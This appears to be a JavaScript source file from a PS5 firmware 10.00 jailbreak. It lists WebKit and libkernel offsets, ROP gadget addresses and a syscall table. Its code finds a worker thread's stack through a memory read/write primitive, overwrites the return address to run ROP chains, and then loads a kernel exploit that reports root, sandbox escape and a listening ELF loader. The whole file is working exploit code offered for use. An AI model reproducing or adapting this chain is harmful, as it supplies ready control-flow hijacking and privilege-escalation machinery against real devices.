const OFFSET_wk_host_constructor_candidates = [0x00002C00, 0x00005178, 0x00005690];
const OFFSET_wk_vtable_first_element     = 0;
const OFFSET_wk_memset_import                  = 0x035CFCA8;
const OFFSET_wk___stack_chk_guard_import       = 0x035CD6B8;

const OFFSET_lk___stack_chk_guard              = 0x0006D1D0;
const OFFSET_lk__thread_list                   = 0x00064218;
const OFFSET_lk_worker_wait_return             = 0x0001F281;
const OFFSET_lk_pthread_create_name_np         = 0x00020E40;
const OFFSET_lk_pthread_join                   = 0x00021F40;
const OFFSET_lk_pthread_exit                   = 0x000211D0;
const OFFSET_lk_sleep                          = 0x00027360;
const OFFSET_lk_sceKernelGetCurrentCpu         = 0x000011E0;

const OFFSET_lc_memset                         = 0x00015170;
const OFFSET_lc_setjmp                         = 0x0005A2B0;
const OFFSET_lc_longjmp                        = 0x0005A300;

const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;

let wk_gadgetmap = {
	"ret": 0x000000C7,
	"pop rdi": 0x0005FC4E,
	"pop rsi": 0x001027FA,
	"pop rdx": 0x00106760,
	"pop rcx": 0x00024D8D,
	"pop rax": 0x00045B53,
	"pop rsp": 0x000394C0,
	"pop r8": 0x017DAF73,
	"pop r9": 0x001844F6,
	"mov [rdi], rsi": 0x000649A0,
	"mov [rdi], rax": 0x00032A57,
	"mov [rdi], eax": 0x00032A58,
	"mov rax, [rax]": 0x00024F22,
	"add rax, rcx": 0x0004B135,
	"cmp [rcx], eax": 0x02CBBE87,
	"inc dword [rax]": 0x00169F14,
	"seta al": 0x0002387C,
	"setb al": 0x00046098,
	"sete al": 0x000095A9,
	"setg al": 0x010C8546,
	"setl al": 0x00102D5E,
	"shl rax, 3": 0x01D61EE3,
	"shl rax, 4": 0x00DA26A2,
	"shr rax, 3": 0x00D95051,
	"shr rax, 4": 0x01BCCBF3,
	"infloop": 0x0005418A,
};

let syscall_map = {
	0x001: 0x0001B21A, 0x002: 0x0001CC20, 0x003: 0x0001ADE0, 0x004: 0x0001AD40,
	0x005: 0x0001B3E0, 0x006: 0x0001BA10, 0x007: 0x0001A5E0, 0x00A: 0x0001C760,
	0x00C: 0x0001C0D0, 0x00F: 0x0001BA90, 0x014: 0x0001AF60, 0x017: 0x0001AA40,
	0x018: 0x0001C0B0, 0x019: 0x0001B420, 0x01B: 0x0001B4C0, 0x01C: 0x0001B6F0,
	0x01D: 0x0001C280, 0x01E: 0x0001A940, 0x01F: 0x0001A760, 0x020: 0x0001C900,
	0x021: 0x0001C420, 0x022: 0x0001C5A0, 0x023: 0x0001BF50, 0x024: 0x0001CE50,
	0x025: 0x0001B3C0, 0x027: 0x0001AE60, 0x029: 0x0001C480, 0x02A: 0x0001ADB0,
	0x02B: 0x0001CAC0, 0x02C: 0x0001CE10, 0x02F: 0x0001A8E0, 0x031: 0x0001A8C0,
	0x032: 0x0001C1B0, 0x035: 0x0001AB00, 0x036: 0x0001AC80, 0x037: 0x0001BF90,
	0x038: 0x0001BE90, 0x03B: 0x0001B6AD, 0x041: 0x0001BAF0, 0x049: 0x0001B2E0,
	0x04A: 0x0001C090, 0x04B: 0x0001B1D0, 0x04E: 0x0001B3A0, 0x04F: 0x0001A840,
	0x050: 0x0001AE00, 0x053: 0x0001A820, 0x056: 0x0001A640, 0x059: 0x0001BEF0,
	0x05A: 0x0001C300, 0x05C: 0x0001B8F0, 0x05D: 0x0001B440, 0x05F: 0x0001A880,
	0x060: 0x0001B7D0, 0x061: 0x0001B020, 0x062: 0x0001C0F0, 0x063: 0x0001CA80,
	0x064: 0x0001A600, 0x065: 0x0001C6A0, 0x066: 0x0001CA20, 0x068: 0x0001C720,
	0x069: 0x0001B930, 0x06A: 0x0001AC20, 0x071: 0x0001BC50, 0x072: 0x0001B600,
	0x074: 0x0001CE30, 0x075: 0x0001CF10, 0x076: 0x0001A5C0, 0x078: 0x0001B870,
	0x079: 0x0001B6D0, 0x07A: 0x0001C360, 0x07C: 0x0001B260, 0x07D: 0x0001BAD0,
	0x07E: 0x0001CA00, 0x07F: 0x0001B5C0, 0x080: 0x0001C580, 0x083: 0x0001B540,
	0x085: 0x0001CE70, 0x086: 0x0001CCA0, 0x087: 0x0001C010, 0x088: 0x0001BD90,
	0x089: 0x0001AFC0, 0x08A: 0x0001A4B0, 0x08C: 0x0001C9C0, 0x08D: 0x0001BAB0,
	0x093: 0x0001BD30, 0x0A5: 0x0001A7E0, 0x0B6: 0x0001C800, 0x0B7: 0x0001A620,
	0x0BC: 0x0001C860, 0x0BD: 0x0001CC60, 0x0BE: 0x0001B5E0, 0x0BF: 0x0001ACE0,
	0x0C0: 0x0001BFD0, 0x0C2: 0x0001B520, 0x0C3: 0x0001B100, 0x0C4: 0x0001C780,
	0x0CA: 0x0001C560, 0x0CB: 0x0001BBB0, 0x0CC: 0x0001C600, 0x0CE: 0x0001B060,
	0x0D1: 0x0001B640, 0x0E8: 0x0001A6E0, 0x0E9: 0x0001BB70, 0x0EA: 0x0001CBD0,
	0x0EB: 0x0001C7A0, 0x0EC: 0x0001AEC0, 0x0ED: 0x0001CC80, 0x0EE: 0x0001C110,
	0x0EF: 0x0001B280, 0x0F0: 0x0001C660, 0x0F1: 0x0001BE70, 0x0F2: 0x0001AE20,
	0x0F3: 0x0001BCD0, 0x0F7: 0x0001C700, 0x0FB: 0x0001B1F9, 0x0FD: 0x0001C2A0,
	0x110: 0x0001CA60, 0x121: 0x0001C150, 0x122: 0x0001B660, 0x136: 0x0001B360,
	0x13B: 0x0001C880, 0x144: 0x0001AEE0, 0x145: 0x0001C320, 0x147: 0x0001AFE0,
	0x148: 0x0001BC70, 0x149: 0x0001A780, 0x14A: 0x0001B620, 0x14B: 0x0001B480,
	0x14C: 0x0001AA00, 0x14D: 0x0001AB20, 0x14E: 0x0001AD70, 0x154: 0x0001A510,
	0x155: 0x0001A550, 0x157: 0x0001C4A0, 0x159: 0x0001C5C0, 0x15A: 0x0001C1E0,
	0x16A: 0x0001C7E0, 0x16B: 0x0001A9C0, 0x17B: 0x0001A960, 0x188: 0x0001AA80,
	0x189: 0x0001CF50, 0x18D: 0x0001AF40, 0x190: 0x0001AAE0, 0x191: 0x0001B890,
	0x192: 0x0001C170, 0x193: 0x0001CF30, 0x194: 0x0001AC40, 0x195: 0x0001C6C0,
	0x196: 0x0001C380, 0x197: 0x0001AAA0, 0x198: 0x0001C340, 0x1A0: 0x0001C840,
	0x1A1: 0x0001C4E0, 0x1A5: 0x0001B164, 0x1A6: 0x0001BED0, 0x1A7: 0x0001BFF0,
	0x1AD: 0x0001B1B0, 0x1AE: 0x0001A860, 0x1AF: 0x0001ABE0, 0x1B0: 0x0001B580,
	0x1B1: 0x0001AC00, 0x1B9: 0x0001C260, 0x1BA: 0x0001A530, 0x1BB: 0x0001AE80,
	0x1BC: 0x0001BF30, 0x1C6: 0x0001A5B0, 0x1C7: 0x0001C980, 0x1C8: 0x0001C8E0,
	0x1D0: 0x0001C220, 0x1D2: 0x0001B790, 0x1DB: 0x0001AF20, 0x1DC: 0x0001C070,
	0x1DD: 0x0001C960, 0x1DE: 0x0001C460, 0x1DF: 0x0001B4A0, 0x1E0: 0x0001AF00,
	0x1E1: 0x0001A4D0, 0x1E2: 0x0001CED0, 0x1E3: 0x0001C940, 0x1E6: 0x0001B120,
	0x1E7: 0x0001CD40, 0x1E8: 0x0001C500, 0x1F3: 0x0001A8A0, 0x203: 0x0001BFB0,
	0x20A: 0x0001B9B0, 0x214: 0x0001BA70, 0x215: 0x0001B7F0, 0x216: 0x0001BDF0,
	0x217: 0x0001ACC0, 0x218: 0x0001BB10, 0x21A: 0x0001BA50, 0x21B: 0x0001AEA0,
	0x21C: 0x0001BE10, 0x21D: 0x0001B9D0, 0x21E: 0x0001BCB0, 0x21F: 0x0001C4C0,
	0x220: 0x0001BE30, 0x221: 0x0001C3E0, 0x222: 0x0001B190, 0x223: 0x0001BC90,
	0x224: 0x0001B560, 0x225: 0x0001B770, 0x226: 0x0001A720, 0x227: 0x0001A6A0,
	0x228: 0x0001CD20, 0x229: 0x0001BD70, 0x22A: 0x0001C3A0, 0x22B: 0x0001C030,
	0x22C: 0x0001B8D0, 0x22D: 0x0001B680, 0x22E: 0x0001B380, 0x22F: 0x0001CFB0,
	0x230: 0x0001AE40, 0x233: 0x0001B7B0, 0x234: 0x0001A800, 0x235: 0x0001B830,
	0x236: 0x0001B850, 0x237: 0x0001C2E0, 0x23C: 0x0001B0C0, 0x249: 0x0001C740,
	0x24A: 0x0001B2A0, 0x24B: 0x0001BB50, 0x24C: 0x0001A680, 0x24F: 0x0001ACA0,
	0x250: 0x0001AFA0, 0x251: 0x0001CAA0, 0x252: 0x0001B950, 0x253: 0x0001A920,
	0x254: 0x0001C820, 0x255: 0x0001BBF0, 0x256: 0x0001B750, 0x257: 0x0001CB00,
	0x258: 0x0001A4F0, 0x259: 0x0001B080, 0x25A: 0x0001B710, 0x25B: 0x0001C5E0,
	0x25C: 0x0001AB60, 0x25D: 0x0001B2C0, 0x25E: 0x0001AA60, 0x25F: 0x0001BC10,
	0x260: 0x0001CEF0, 0x262: 0x0001CF90, 0x263: 0x0001AD90, 0x264: 0x0001CD00,
	0x265: 0x0001A490, 0x267: 0x0001B810, 0x268: 0x0001C920, 0x269: 0x0001BF10,
	0x26A: 0x0001BBD0, 0x26B: 0x0001A9A0, 0x26C: 0x0001AAC0, 0x26E: 0x0001A6C0,
	0x26F: 0x0001BB30, 0x270: 0x0001CF70, 0x271: 0x0001C520, 0x272: 0x0001B000,
	0x273: 0x0001A660, 0x274: 0x0001BD10, 0x275: 0x0001B0A0, 0x276: 0x0001B8B0,
	0x278: 0x0001CEB0, 0x279: 0x0001B340, 0x27A: 0x0001B300, 0x27B: 0x0001B400,
	0x27C: 0x0001B040, 0x27D: 0x0001BDB0, 0x27E: 0x0001B140, 0x27F: 0x0001CFD0,
	0x280: 0x0001C130, 0x281: 0x0001AC60, 0x282: 0x0001B4E0, 0x283: 0x0001C2C0,
	0x286: 0x0001CC00, 0x287: 0x0001BDD0, 0x288: 0x0001A700, 0x289: 0x0001C9A0,
	0x28C: 0x0001A7A0, 0x28D: 0x0001AF80, 0x28E: 0x0001AD20, 0x28F: 0x0001C7C0,
	0x290: 0x0001C400, 0x291: 0x0001B460, 0x292: 0x0001ABC0, 0x293: 0x0001B0E0,
	0x294: 0x0001CE90, 0x295: 0x0001C640, 0x296: 0x0001AB40, 0x297: 0x0001B990,
	0x298: 0x0001AA20, 0x299: 0x0001C540, 0x29A: 0x0001B970, 0x29B: 0x0001A900,
	0x29C: 0x0001C050, 0x29D: 0x0001CAE0, 0x29E: 0x0001C9E0, 0x29F: 0x0001C440,
	0x2A0: 0x0001C8A0, 0x2A1: 0x0001CA40, 0x2A2: 0x0001C8C0, 0x2A3: 0x0001B910,
	0x2A4: 0x0001C200, 0x2A5: 0x0001BCF0, 0x2A6: 0x0001B730, 0x2A7: 0x0001AD00,
	0x2A8: 0x0001BA30, 0x2A9: 0x0001C240, 0x2AA: 0x0001A980, 0x2AB: 0x0001CD60,
	0x2AC: 0x0001B500, 0x2AD: 0x0001A740, 0x2AE: 0x0001A590, 0x2AF: 0x0001ABA0,
	0x2B0: 0x0001B5A0, 0x2B1: 0x0001CCE0, 0x2B2: 0x0001BF70, 0x2B3: 0x0001BEB0,
	0x2B4: 0x0001C680, 0x2B5: 0x0001BB90, 0x2B6: 0x0001B9F0, 0x2C1: 0x0001A9E0,
	0x2C9: 0x0001CCC0, 0x2CC: 0x0001B240, 0x2CD: 0x0001BD50, 0x2CE: 0x0001B320,
	0x2CF: 0x0001A570, 0x2D0: 0x0001C620, 0x2D1: 0x0001C6E0, 0x2D2: 0x0001A7C0,
	0x2D5: 0x0001BE50, 0x2DC: 0x0001C3C0, 0x2DD: 0x0001AB80,
};

const OFFSET_KERNEL_ALLPROC                    = 0x03425D70;
const OFFSET_KERNEL_SECURITY_FLAGS             = 0x01A39064;
const OFFSET_KERNEL_TARGETID                   = 0x01A39064 + 0x09;
const OFFSET_KERNEL_QA_FLAGS                   = 0x01A39064 + 0x24;
const OFFSET_KERNEL_UTOKEN_FLAGS               = 0x01A39064 + 0x8C;
const OFFSET_KERNEL_ROOTVNODE                  = 0x03C63510;
const OFFSET_KERNEL_VMSPACE_P_ROOT             = 0x1d0;
const OFFSET_KERNEL_VMSPACE_VM_PMAP            = 0x2e8;
const OFFSET_KERNEL_DATA                       = 0x00CC0000;

window.KRW = {
    firmware: "10.00",
    security_flags: OFFSET_KERNEL_SECURITY_FLAGS,
    kernelData: OFFSET_KERNEL_DATA,
    allproc:    OFFSET_KERNEL_ALLPROC,
    rootvnode:  OFFSET_KERNEL_ROOTVNODE,
    kaslr: { 
        mode: "rtmsg2", 
        retStatic: 0x00ADF87F, 
        retLow16: 0xF87F,
        offlineBypass: true,
        fallbackBase: 0x80000000
    },
    oid: {
        originalKind: 0x80048002,
        writableKind: 0x70048002,
        a: {
            base: 0x027A8138, kind: 0x027A814C, kindByte3: 0x027A814F,
            arg1: 0x027A8150, arg1Byte1: 0x027A8151, arg1Value: 0x027A8128,
            deadSink: 0x027A8158,
        },
        b: {
            base: 0x027A8010, kind: 0x027A8024, kindByte3: 0x027A8027,
            arg1: 0x027A8028, arg1Value: 0x027A7F40, visible: 0x027A8060,
        },
        c: {
            base: 0x02ACADD8, kind: 0x02ACADEC, arg1: 0x02ACADF0,
            arg1Value: 0x03BE307C, mib: [9, 8],
        },
    },
    walkCounter: { addr: 0x03BE3078, mib: [9, 7] },
    nodeMutex: 0x01A78978,
    rodataProbe: { rva: 0x0112DAE5, text: "_aio_submit_cmd\0_aio_multi_wait" },
    aio: {
        waiterSize: 0x38, requestSize: 0x28,
        group: { num: 0x00, state: 0x08, waiters: 0x50 },
        idTable: { pages: 0x220, slotStride: 0x30, entryType: 0x160 },
    },
    proc: { pid: 0x0bc, ucred: 0x040, fd: 0x048, aioInfo: 0x0c40, dynlib: 0x3e8 },
    kernelPid: 0,
    ucred: { uid: 0x04, ruid: 0x08, svuid: 0x0c, ngroups: 0x10, rgid: 0x14, svgid: 0x18,
        sceAuthId: 0x58, sceCaps: 0x60, sceCaps1: 0x68, sceAttrs: 0x80 },
    sysCoreAuthId: { lo: 0x00000007, hi: 0x48000000 },
    filedesc:      { files: 0x00, cdir: 0x08, rdir: 0x10, jdir: 0x18 },
    filedescTable: { nfiles: 0x00, ofiles: 0x08, entryStride: 0x30, fileData: 0x00 },
    pipe: { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, pair: 0xe8, defaultSize: 0x4000 },
    dynlib: { syscallStart: 0xf0, syscallEnd: 0xf8, restrictFlags: 0x118, libkernelRef: 0x18 },
};

window.SYMBOLS = {
    libkernel: {
        getpid:                           0x0001AF60,
        sysctlbyname:                     0x000134B0,
        sceKernelSendNotificationRequest: 0x000045C0,
        pthread_create:                   0x00020780,
        pthread_create_name_np:           0x00020E40,
        pthread_join:                     0x00021F40,
    },
    libc: {
        malloc: 0x00005F30, free: 0x00005F40, memcpy: 0x00003D10,
        memset: 0x00015170, strcmp: 0x0003FCF0, memcmp: 0x00075650,
        vsnprintf: 0x0005B9C0,
    },
};


function countFingerprints(p, stack, expected) {
  let count = 0;
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function findWorkerStack(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  const plausible = (a) =>
    a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  const head = libKernelBase.add32(OFFSET_lk__thread_list);

  const stacks = [];
  let steps = 0;
  for (
    let thread = p.read8(head);
    thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
      stacks.push(stack);
    thread = next;
  }
  if (stacks.length === 0)
    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);

  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((stack) =>
      countFingerprints(p, stack, expected) > 0,
    );
    if (hits.length === 1) return hits[0];
    if (hits.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 1));
      continue;
    }
    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`);
  }
  throw new Error(`no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`);
}

async function findWorkerReturnSlot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function log(message, type = "log") {
  window.writeLog(message, type);
}

function watchR2(onPress) {
  function onKey(event) {
    if (event.key !== "F8" || event.code !== "Unidentified") return;
    window.removeEventListener("keydown", onKey, true);
    event.preventDefault();
    onPress();
  }

  log("press R2 to load kstuff, shadowmountplus and etaHEN", "info");
  window.addEventListener("keydown", onKey, true);
}

const ROP_WAIT_MS = 20000;

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepareRop(p) {
  const ctor = globalThis.__ps5NativeCtor;
  let webkitBase;
  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
    for (const offset of OFFSET_wk_host_constructor_candidates) {
      const candidate = ctor - offset;
      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
        webkitBase = candidate;
        break;
      }
    }
  }
  if (webkitBase === undefined)
    throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
    Math.floor(webkitBase / 0x100000000));

  let libSceLibcInternalBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let libKernelBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  const gadgets = {};
  const syscalls = {};

  for (const gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (const sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  const allocations = [];

  function malloc(size, type = 4) {
    const backing =
      type === 1
        ? new Uint8Array(1000 + size)
        : new Uint32Array(0x10000 + size);
    allocations.push(backing);

    const ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function stringify(str) {
    const bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }

    const ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) {
          break;
        }
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0x0);
  }

  const worker = new Worker("./src/utils/rop_slave.js");

  async function waitForWorker() {
    return new Promise((resolve, reject) => {
      worker.onmessage = () => resolve();
      worker.onerror = () => reject(new Error("Worker failed to load"));
      worker.postMessage(0);
    });
  }

  jbmark("Worker", "waiting");
  await waitForWorker();
  jbmark("Worker", "ready");

  const workerStack = await findWorkerStack(p, libKernelBase);
  const originalContext = malloc(0x40);

  const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
  const originalReturnAddress = p.read8(returnAddress);
  const stackPointerSlot = returnAddress.add32(0x8);

  function prepareChain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  async function launchChain(chain) {
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    const completed = await new Promise((resolve) => {
      let settled = false;
      const finish = (value) => {
        if (settled) return;
        settled = true;
        resolve(value);
      };
      worker.onmessage = () => finish(true);
      setTimeout(() => finish(false), ROP_WAIT_MS);
      worker.postMessage(0);
    });

    if (!completed)
      throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
  }

  const runtime = {
    write8: p.write8,
    write4: p.write4,
    write2: p.write2,
    write1: p.write1,
    read8: p.read8,
    read4: p.read4,
    read2: p.read2,
    read1: p.read1,
    leakval: p.leakval,
    pre_chain: prepareChain,
    launch_chain: launchChain,
    malloc,
    stringify,
    writestr,
    libSceLibcInternalBase,
    libKernelBase,
    syscalls,
    gadgets,
  };

  const chain = new worker_rop(runtime);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
  p.write8(chain.return_value, JB_POISON);
  const pid = await chain.syscall(SYS_GETPID);
  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
    throw new Error("Worker chain did not execute; the return slot is unchanged.");
  }

  if (pid.low == 0) {
    throw new Error("WebKit exploit failed.");
  }
  jbmark("Worker chain", "ready");

  return { p: runtime, chain };
}

async function main(userlandRW) {
  const { p, chain } = await prepareRop(userlandRW);
  const { runKernelExploit } = await import("./relapse_exploit.js");
  const result = await runKernelExploit(p, chain, log);
  if (!result || !result.done)
    throw new Error("kernel exploit did not finish");

  if (result.payloads) {
    log("kernel exploit complete", "info");
    log("elfldr is listening on port 9021", "info");
    watchR2(async () => {
      try {
        const { loadOptionalPayloads } = await import("./kexp.js");
        await loadOptionalPayloads(p, chain, (message) => log(message, "info"));
      } catch (error) {
        log(error instanceof Error ? error.message : String(error), "error");
      }
    });
  } else {
    log("kernel chain complete: root and sandbox escape are active", "info");
  }
}